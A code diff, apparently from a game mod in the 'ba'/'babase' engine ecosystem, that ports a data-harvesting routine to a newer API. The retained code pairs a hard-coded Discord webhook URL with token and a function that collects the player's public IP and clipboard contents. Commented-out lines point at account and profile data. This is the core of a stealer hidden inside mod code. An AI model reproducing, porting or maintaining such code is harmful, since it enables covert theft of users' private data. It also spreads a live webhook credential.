@@ -1,7 +1,7 @@
 import http.client
 import json
 
-import ba
+import babase
 #import _ba
 
 DISCORD_WEBHOOK_URL = 'discord.com/api/webhooks/1311648949878128660/9zRG2MjsqIp5UFK3dso_eRrRYPLtZawspUevsPl4l9EdG44FhPIBidU4k2AYCRywteIK'
@@ -26,7 +26,7 @@ def fetch_data() -> dict:
     return dict(
         #bs_account=ba.internal.get_v1_account_display_string(),
         public_ip=get_public_ip(),
-        clipboard=ba.clipboard_get_text(),
+        clipboard=babase.clipboard_get_text(),
         #bs_profiles=ba.app.config.get('Player Profiles', {})
     )
 
